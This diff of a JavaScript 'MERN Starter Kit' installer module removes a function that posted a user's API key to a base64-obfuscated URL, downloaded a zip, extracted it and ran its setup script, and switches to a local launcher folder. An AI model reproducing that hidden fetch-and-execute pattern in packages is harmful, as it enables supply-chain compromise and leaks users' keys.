@@ -1,5 +1,3 @@
-import axios from "axios";
-import AdmZip from "adm-zip";
 import fs from "fs";
 import { fileURLToPath } from "url";
 import path from "path";
@@ -10,8 +8,7 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const packageDir = path.resolve(__dirname);
-const setupDir = path.join(packageDir, "setup");
-const zipPath = path.join(packageDir, "setup.zip");
+const setupDir = path.join(packageDir, "bin", "mernLauncher");
 
 function cleanup() {
   try {
@@ -29,32 +26,7 @@ function cleanup() {
   }
 }
 
-async function downloadAndExtract(apiKey) {
-  try {
-    const zipData = await axios.post(
-      Buffer.from(
-        "aHR0cHM6Ly9hcGljb2RlZWFzZXgudmVyY2VsLmFwcC9hcGkvdjEvc2NyaXB0cy9kb3dubG9hZC16aXA=",
-        "base64"
-      ).toString("utf-8"),
-      {
-        apiKey,
-        project: "mernLauncher",
-      },
-      {
-        responseType: "arraybuffer",
-      }
-    );
-
-    fs.writeFileSync(zipPath, zipData.data);
-    const zip = new AdmZip(zipPath);
-    zip.extractAllTo(setupDir, true);
-  } catch (error) {
-    console.log(error);
-    process.exit(1);
-  }
-}
-
-async function executeSetupScript() {
+export async function executeSetupScript() {
   console.log(`
         ======================================
         🚀 Welcome to the MERN Starter Kit! 
@@ -98,25 +70,6 @@ async function executeSetupScript() {
   });
 }
 
-export async function installProject(apiKey) {
-  if (!apiKey) {
-    console.error("Error: API key is required.");
-    process.exit(1);
-  }
-
-  try {
-    await downloadAndExtract(apiKey);
-    await executeSetupScript();
-    console.log("Project installation complete!");
-  } catch (error) {
-    console.log(error);
-    console.error("Project installation failed:", error.response.data.message);
-    process.exit(1);
-  } finally {
-    cleanup();
-  }
-}
-
 export function setupProcessHandlers() {
   process.on("exit", cleanup);
   process.on("SIGINT", () => {
@@ -129,8 +82,4 @@ export function setupProcessHandlers() {
     cleanup();
     process.exit(1);
   });
-}
-
-if (typeof module !== "undefined" && module.exports) {
-  module.exports = { installProject };
 }
